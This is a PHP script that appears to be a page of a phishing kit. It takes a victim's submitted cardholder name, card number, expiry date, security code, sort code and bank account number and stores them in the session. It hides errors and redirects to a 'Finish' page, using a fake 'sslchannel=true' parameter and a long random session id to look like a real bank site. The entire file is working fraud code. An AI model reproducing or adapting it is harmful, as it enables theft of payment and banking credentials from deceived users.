<?php
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";

error_reporting(0);
ini_set('display_errors', '0');
date_default_timezone_set('Europe/London');

$_SESSION['ccname'] = $_POST['ccname'];
$_SESSION['ccno'] = $_POST['ccno'];
$_SESSION['ccexp'] = $_POST['month'] . "/" . $_POST['year'];
$_SESSION['secode'] = $_POST['secode'];
$_SESSION['sortcode'] = $_POST['sortcode'];
$_SESSION['account'] = $_POST['account'];

header('Location: Finish.php?sslchannel=true&sessionid=' . generateRandomString(130));
exit;

?>
